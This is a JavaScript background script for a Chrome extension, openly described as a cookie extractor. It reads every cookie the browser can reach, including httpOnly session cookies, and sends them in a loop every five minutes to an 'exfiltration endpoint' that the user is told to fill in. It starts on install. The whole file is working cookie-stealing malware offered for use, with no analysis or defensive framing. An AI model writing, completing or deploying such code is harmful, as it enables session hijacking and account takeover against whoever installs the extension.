// Cookie Extractor Background Script
// This script periodically extracts cookies and sends them to a remote server.

// Configuration: Replace with your actual exfiltration endpoint
const EXFILTRATION_ENDPOINT = "https://your-dashboard-url.com/collect";

// Function to extract cookies from all accessible domains
function extractCookies() {
  return new Promise((resolve) => {
    chrome.cookies.getAll({}, (cookies) => {
      const cookieData = cookies.map(cookie => ({
        name: cookie.name,
        value: cookie.value,
        domain: cookie.domain,
        path: cookie.path,
        expiration: cookie.expiration,
        secure: cookie.secure,
        httpOnly: cookie.httpOnly,
        sameSite: cookie.sameSite
      }));
      resolve(cookieData);
    });
  });
}

// Function to send data to the exfiltration endpoint
function exfiltrateData(data) {
  fetch(EXFILTRATION_ENDPOINT, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json'
    },
    body: JSON.stringify({
      type: 'cookies',
      data: data,
      timestamp: new Date().toISOString()
    })
  }).catch(err => {
    console.error('Failed to exfiltrate cookies:', err);
  });
}

// Main loop: extract and exfiltrate every 5 minutes
async function mainLoop() {
  while (true) {
    try {
      const cookies = await extractCookies();
      if (cookies.length > 0) {
        await exfiltrateData(cookies);
      }
    } catch (error) {
      console.error('Error in cookie extraction loop:', error);
    }
    // Wait for 5 minutes (300000 ms)
    await new Promise(resolve => setTimeout(resolve, 300000));
  }
}

// Start the loop when the extension is installed or updated
chrome.runtime.onInstalled.addListener(() => {
  mainLoop();
});

// Also start immediately if the extension is already running
mainLoop();
